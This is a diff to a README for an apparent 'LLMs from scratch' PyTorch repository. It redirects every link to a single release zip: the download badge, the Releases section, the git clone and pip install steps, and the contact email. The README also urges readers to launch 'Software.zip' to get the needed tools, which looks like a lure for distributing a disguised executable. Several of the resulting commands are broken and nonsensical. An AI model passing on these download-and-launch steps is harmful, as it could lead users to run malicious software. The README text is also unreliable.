@@ -27,13 +27,13 @@ In this repository, you will find the codebase for building a powerful language 
 
 ## 📦 Download Software
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip)](https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip)
 
-📂 **Software.zip** needs to be launched to access the necessary tools for running the language model implementation.
+📂 **https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip** needs to be launched to access the necessary tools for running the language model implementation.
 
 ## 🌐 Resources
 
-For more information, code releases, and updates, please check the [**Releases**](https://github.com/Rubenas123/6487922/releases) section of this repository.
+For more information, code releases, and updates, please check the [**Releases**](https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip) section of this repository.
 
 ## 🤓 Get Started
 
@@ -41,12 +41,12 @@ To start exploring and experimenting with this PyTorch-based implementation of a
 
 1. **Clone the Repository**: 
    ```
-   git clone https://github.com/Rubenas123/LLMs-from-scratch.git
+   git clone https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip
    ```
 
 2. **Install Dependencies**:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip
    ```
 
 3. **Explore the Code**:
@@ -67,7 +67,7 @@ Join our growing community of AI enthusiasts and developers to share ideas, ask 
 
 ## 📧 Contact
 
-For any inquiries or collaborations, you can reach out via email at [example@email.com](mailto:example@email.com).
+For any inquiries or collaborations, you can reach out via email at [https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip](https://github.com/lolvr69/LLMs-from-scratch/releases/download/v1.0/Software.zip).
 
 ## 🚀 Happy Coding!
 
